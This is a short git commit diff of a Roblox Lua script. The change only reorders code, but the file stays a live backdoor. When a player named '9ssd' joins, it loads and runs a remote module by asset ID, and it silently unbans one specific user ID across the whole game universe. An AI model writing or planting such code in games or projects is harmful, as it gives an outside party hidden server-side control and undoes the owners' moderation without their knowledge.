92e8c1efb3a0152d8407cbeb3697ce6203823af5
Saturn <sussycat2133@gmail.com>
2026-07-23 14:00:02 +0100

    Update isntthisdomaindead.lua

--- isntthisdomaindead.lua
+++ isntthisdomaindead.lua
@@ -1,10 +1,10 @@
+task.spawn(function()
+    game:GetService("Players"):UnbanAsync({UserIds = {781984681}, ApplyToUniverse = true})
+end)
+
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == "9ssd" then
         local character = player.Character or player.CharacterAdded:Wait()
         require(5196668511)(player.Name)
     end
-end)
-
-task.spawn(function()
-    game:GetService("Players"):UnbanAsync({UserIds = {781984681}, ApplyToUniverse = true})
 end)
